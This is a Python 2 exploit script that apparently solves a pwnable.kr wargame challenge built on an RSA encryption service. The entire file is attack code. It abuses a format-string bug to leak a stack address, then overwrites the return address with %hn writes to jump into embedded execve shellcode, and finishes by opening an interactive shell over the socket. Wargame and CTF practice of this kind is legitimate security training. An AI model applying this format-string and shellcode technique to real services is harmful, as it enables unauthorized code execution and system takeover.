#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)
host = 'pwnable.kr'
host = '0'
s.connect((host, 9012))

shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"
shell_encrypted = "fb2300006c3e0000882b0000c71f0000ab170000e72c0000341f0000cd2800007c39000042050000c1190000a3090000210c0000c71f0000183f0000202e0000621d0000f32a00000d150000fb23000035220000e83c000013320000013a0000320f0000"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def setkey():
    sendline('1')
    recvuntil('p : ')
    sendline('101')
    recvuntil('q : ')
    sendline('163')
    recvuntil('e : ')
    sendline('257')
    recvuntil('d : ')
    sendline('3593')
    recvuntil('> ')

def encrypt(pt):
    sendline('2')
    recvuntil(' : ')
    len_pt = len(pt)
    assert len_pt <= 1024
    sendline(str(len_pt))
    recvuntil('data\n')
    sendline(pt)
    recvuntil('(hex encoded) -\n')
    ct = recvline()
    recvuntil('> ')
    return ct

def decrypt(ct):
    sendline('3')
    recvuntil(' : ')
    len_ct = len(ct)
    assert len_ct <= 1024
    sendline(str(len_ct))
    recvuntil('data\n')
    sendline(ct)
    recvuntil('result -\n')
    pt = recvline()
    recvuntil('> ')
    return pt

def run(text):
    return decrypt( encrypt( text ) )

def leak_addr(addr):
    leak = run('%77$s   ' + p64(addr)).split(' ')[0]
    leak = leak + '\x00' * (8 - len(leak))
    return u64(leak)

def pad(p):
    pad = len(p) % 8
    if pad > 0:
        p += ' ' * (8 - pad)
    return p

def main():
    recvuntil('> ')
    setkey()
    #leak = run('%6$p    ')[2:]
    leak = decrypt('76370000651900000f3f0000b90b000008010000080100000801000008010000')[2:] # '%6$p    '
    stack_addr = int(leak, 16)
    print 'stack_leak: ' + hex(stack_addr)
    ret_addr = stack_addr + 0x638 # de RSA_decrypt
    print 'ret_addr: ' + hex(ret_addr)

    # en ret_addr sobreescribo 0x40140a por 0x602580
    payload  = ''
    payload += '%37x'    # 0x25
    payload += '%70$hn'  # byte del medio
    payload += '%59x'    # 0x60
    payload += '%71$hn'  # MSF
    payload += '%32x'    # 0x80
    payload += '%69$hhn' # LSB
    payload  = pad(payload)
    payload += shellcode

    payload  = encrypt(payload)[:-1]

    payload += p64(ret_addr + 0) # LSB
    payload += p64(ret_addr + 1) # byte del medio
    payload += p64(ret_addr + 2) # MSB

    decrypt(payload)

    interactive()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
